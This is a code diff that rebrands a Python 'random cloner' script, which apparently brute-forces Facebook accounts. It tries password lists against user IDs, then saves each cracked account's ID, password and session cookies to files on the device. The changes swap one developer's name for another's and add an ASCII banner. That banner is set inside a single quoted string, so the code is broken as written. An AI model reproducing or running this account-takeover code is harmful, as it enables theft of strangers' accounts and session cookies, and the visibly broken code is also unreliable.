@@ -16,9 +16,14 @@ class Mr_Code:
     
     def banner(self):
         os.system("clear")
-        print("DEVELOPER  : HADI ANHAF AIMAN")
+        print("DEVELOPER  : ___  ___                _     _     _       
+|  \/  |               | |   | |   (_)      
+| .  . | ___  ___  __ _| |__ | |__  _ _ __  
+| |\/| |/ _ \/ __|/ _` | '_ \| '_ \| | '__| 
+| |  | | (_) \__ \ (_| | |_) | |_) | | |    
+\_|  |_/\___/|___/\__,_|_.__/|_.__/|_|_|")
         print("FEATURE    : RANDOM CLONER")
-        print("VERSION    : 1.3")
+        print("VERSION    : 0.1")
         print("----------------------------------")
     
     def Main(self):
@@ -40,7 +45,7 @@ class Mr_Code:
     
     def method(self,ids,passlist):
         global loop,oks,cps
-        sys.stdout.write(f"\r\r\x1b[mAIMAN-XD {self.loop}|RND|OK:-{len(self.oks)}|CP:-{len(self.cps)}")
+        sys.stdout.write(f"\r\r\x1b[mMOSABBIR-XD {self.loop}|RND|OK:-{len(self.oks)}|CP:-{len(self.cps)}")
         sys.stdout.flush()
         try:
             for pas in passlist:
@@ -92,12 +97,12 @@ class Mr_Code:
                     coki = ";".join(i["name"] + "=" + i["value"] for i in response["session_cookies"])
                     req = requests.get(f"https://graph.facebook.com/{uid}/picture?type=normal").text
                     if "Photoshop" in req:
-                        print(f"\r\r\x1b[38;5;46mAIMAN-OK • {uid} • {pas}")
-                        open("/sdcard/AIMAN-RNDM-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
+                        print(f"\r\r\x1b[38;5;46mMOSABBIR-OK • {uid} • {pas}")
+                        open("/sdcard/MOSABBIR-RNDM-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                         self.oks.append(uid)
                         break
                 elif "www.facebook.com" in response["error"]["message"]:
-                    open("/sdcard/AIMAN-RNDM-CP.txt","a").write(ids+"|"+pas+"\n")
+                    open("/sdcard/MOSABBIR-RNDM-CP.txt","a").write(ids+"|"+pas+"\n")
                     self.cps.append(ids)
                     break
                 else:continue
